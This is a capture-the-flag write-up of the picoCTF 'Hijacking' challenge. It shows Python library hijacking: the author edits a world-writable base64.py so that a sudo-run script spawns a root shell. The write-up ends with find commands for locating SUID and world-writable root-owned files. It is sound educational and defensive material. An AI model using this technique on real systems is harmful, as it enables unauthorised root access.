# Hijacking

Learnt something about Linux and Python in this challenge.

The biggest gain is know I should setup a checklist for all kinds of privilege related challenges:

- `sudo --list`
- Search for globally writable files (especially for those owned by root!)
- Search for all the executable with SET-UID bit owned by root

I begin to appreciate why the global writable checks in servers are important now...

<https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/>

I think this challenge is highly relatable to this article...

## The problem

Try to get root access. All we have is...

```bash
$ sudo --list
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

This mean we can run `sudo vi` by entering password (which is the unintended solution to this challenge) and run `sudo /usr/bin/python3 /home/picoctf/.server.py` without entering password and run it as root.

(By the way when we are in `/home/picoctf/`, we can do less typing with `sudo python3 .server.py`)

Then let's try to run the script

```bash
$ ls -Al # Only showing the related python script
-rw-r--r-- 1 root    root     375 Mar 16 01:30 .server.py
# Not writable,cannot edit it,no SUID.
# We can only get root right from sudo python3 .server.py

$ cat ~/.server.py

import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

```bash
$ sudo /usr/bin/python3  /home/picoctf/.server.py # Same as sudo python3 .server.py

sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
```

Weird Python script... And we know `ping` is not available in this server.

If we can change the script (`.server.py`), we can just open a shell to get root permission (`import os; os.system("bash")`)

Also, if we can change the root's PATH, we can supply `ping` which is actually a `bash`. (If we have `SETENV` in sudoer)

But we can't do these... so `ping` and the `os.system()` are just a distraction this time.

## Solution

I guess many people are quite unhappy with this intentionally insecure setup ...

```bash
$ ls -Al /usr/lib/python3.8/base64.py
-rwxrwxrwx 1 root root 20382 Nov 14 12:59 /usr/lib/python3.8/base64.py
```

It is globally writable.

The `.server.py` in our home directory can be "modified indirectly" with the `base64.py` (`import base64`)

So we can just change it a little bit ...

```bash
$ head /usr/lib/python3.8/base64.py

#! /usr/bin/python3.8
import os; os.system("bash")

"""Base16, Base32, Base64 (RFC 3548), Base85 and Ascii85 data encodings"""

# Modified 04-Oct-1995 by Jack Jansen to use binascii module
# Modified 30-Dec-2003 by Barry Warsaw to add full RFC 3548 support
# Modified 22-May-2007 by Guido van Rossum to use bytes everywhere

import re
# ...
```

Then this is the result.

```bash
picoctf@challenge:~$ sudo python3 ~/.server.py
# Yes! We now have the shell as root!
root@challenge:/home/picoctf# whoami
root

root@challenge:/home/picoctf# cat /root/.flag.txt
picoCTF{pYth0nn_that_flag}
```

## Where are these Python modules located

Just execute the `python3` binary then check the `__file__` property.

Shamelessly copy from <https://stackoverflow.com/a/42747425>

```python
>>> import os
>>> print(os.__file__)
/usr/local/lib/python3.11/os.py
```

## Thoughts

If we have the checklist before hand, this will be very obvious and straightforward challenge.

So let's set it up here.

```bash
# Find files with SUID bits and executable owned by root
$ find / -user root -type f -perm -4001  -exec ls {} -Al \; 2>/dev/null

# Find files with SGID bits, slightly less useful
$ find / -user root -type f -perm -2001  -exec ls {} -Al \; 2>/dev/null

# Find globally writable file owned by root
# Should exclude /proc/ and /sys/fs/ in my local machine
$ find / \( -path /proc -o -path /sys/fs \) -prune -o  -user root -type f -perm /002 -exec ls {} -Al \;  2>/dev/null

# cannot be /proc/ and /sys/fs/ (the closing / cannot be added)

# --- Reference ---

# (Assume we use the same number as chmod)

# Note about -perm and /,- and no specifier
# no specifier is exact mode (e.g.: -perm 400 only return exact 400, not 410 or 700 won't match)

# -perm -sugo : ALL the 1 bits of each octal group (ugo)must be met, check example above. So 0 means everything is acceptable. 110 -> 6, in minus mode (-), permission of 6 or 7 will match the -perm -6

# -perm /sugo: Any of the 1 bits matching the octal group (ugo) are ok. This is like the OR for different groups

# Example copy from man find
# Traverse the filesystem just once, listing setuid files and directories into /root/suid.txt
$ find / \( -perm -4000 -fprintf /root/suid.txt '%#m %u %p\n' \)

```
